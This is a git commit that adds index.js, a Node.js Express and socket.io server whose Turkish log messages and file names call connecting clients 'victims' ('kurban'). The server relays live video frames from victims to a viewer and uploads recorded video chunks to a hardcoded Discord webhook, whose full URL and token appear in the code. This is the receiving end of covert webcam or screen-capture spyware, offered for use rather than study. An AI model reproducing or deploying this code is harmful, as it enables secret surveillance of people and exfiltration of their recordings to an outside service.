90a1a74e463704045ec074d042ff6030817a69c4
Zweld <hasanquliyev20@gmail.com>
2026-01-03 17:38:13 +0400

    Update Discord webhook URL in index.js

---
+++ index.js
@@ -0,0 +1,31 @@
+const express = require('express');
+const app = express();
+const server = require('http').createServer(app);
+const io = require('socket.io')(server);
+
+app.use(express.static('public'));
+
+const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1457004948612059263/UbJEsjQBcQGHJMihPFXpnYbyeh3y6bMa2AogkRsU610dYa74O6ASBMD_GQOW9qs0Hs1K'; // DEĞİŞTİR!!
+
+let viewer = null;
+
+io.on('connection', (socket) => {
+  console.log('Kurban bağlandı');
+
+  socket.on('frame', (data) => {
+    if (viewer) viewer.emit('frame', data);
+  });
+
+  socket.on('videoChunk', async (base64) => {
+    const buffer = Buffer.from(base64, 'base64');
+
+    const form = new FormData();
+    form.append('file', new Blob([buffer]), 'kurban-' + Date.now() + '.webm');
+
+    try {
+      await fetch(DISCORD_WEBHOOK, { method: 'POST', body: form });
+    } catch (e) {}
+  });
+});
+
+server.listen(process.env.PORT || 3000, () => console.log('Sunucu çalışıyor'));
